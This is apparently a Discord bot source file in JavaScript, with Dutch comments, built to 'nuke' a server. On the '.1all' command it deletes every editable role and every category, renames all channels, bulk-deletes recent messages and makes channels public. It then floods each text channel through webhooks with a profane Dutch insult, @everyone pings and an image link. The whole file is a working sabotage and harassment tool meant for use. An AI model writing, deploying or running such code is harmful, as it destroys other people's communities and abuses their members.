import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://media.discordapp.net/attachments/1534658849372639283/1540407020715253822/MaceExpose.png?ex=6a89d755&is=6a8885d5&hm=23e19fa6ccdf175cf04f013d5b428e105d67cdd682a624b9c3a36ecf181ee003&=&format=webp&quality=lossless&width=853&height=1280";
const WEBHOOK_NAME = "idk who I am";
const WEBHOOK_AVATAR = "https://pfps.gg/pfp/3433-aesthetic-scary";

http.createServer((req, res) => res.end('Bot running!')).listen(3000);

client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.toLowerCase().startsWith('.1all')) return;

    const args = message.content.slice(5).trim().split(/ +/);
    const spamAmount = parseInt(args[0]) || 50;

    // Commando meteen verwijderen
    message.delete().catch(() => {});

    try {
        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x per channel`);
    } catch {}

    let cancelled = false;
    const collector = message.channel.createMessageCollector({
        filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
        time: 3000
    });
    collector.on('collect', () => cancelled = true);

    await new Promise(r => setTimeout(r, 3000));
    if (cancelled) return;

    // Rollen verwijderen
    for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
        try { await role.delete(); } catch {}
    }

    // Categorieën verwijderen
    for (const cat of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
        try { await cat.delete(); } catch {}
    }

    // Channels verwerken
    const allChannels = Array.from(message.guild.channels.cache.filter(ch => 
        ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildVoice
    ).values());

    let processed = 0;

    const promises = allChannels.map(async (channel) => {
        try {
            await channel.setName("get facked");

            if (channel.type === ChannelType.GuildText) {
                await channel.bulkDelete(100, true).catch(() => {});

                await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                    ViewChannel: true,
                    SendMessages: true,
                    ReadMessageHistory: true
                }).catch(() => {});

                const webhook = await channel.createWebhook({
                    name: WEBHOOK_NAME,
                    avatar: WEBHOOK_AVATAR
                }).catch(() => null);

                if (webhook) {
                    for (let i = 0; i < spamAmount; i++) {
                        await webhook.send({
                            content: `Jullie zijn niks op ons, vooral jij tyfes maceswapped je cheat kanker blatant.\n@everyone\n${GIF_URL}`,
                            username: WEBHOOK_NAME,
                            avatarURL: WEBHOOK_AVATAR
                        }).catch(() => {});
                    }
                    webhook.delete().catch(() => {});
                }
            }

            processed++;
        } catch (err) {}
    });

    await Promise.all(promises);

    try {
        await message.author.send(`[DONE] ${processed} channels changed`);
    } catch {}
});

client.login(process.env.TOKEN);
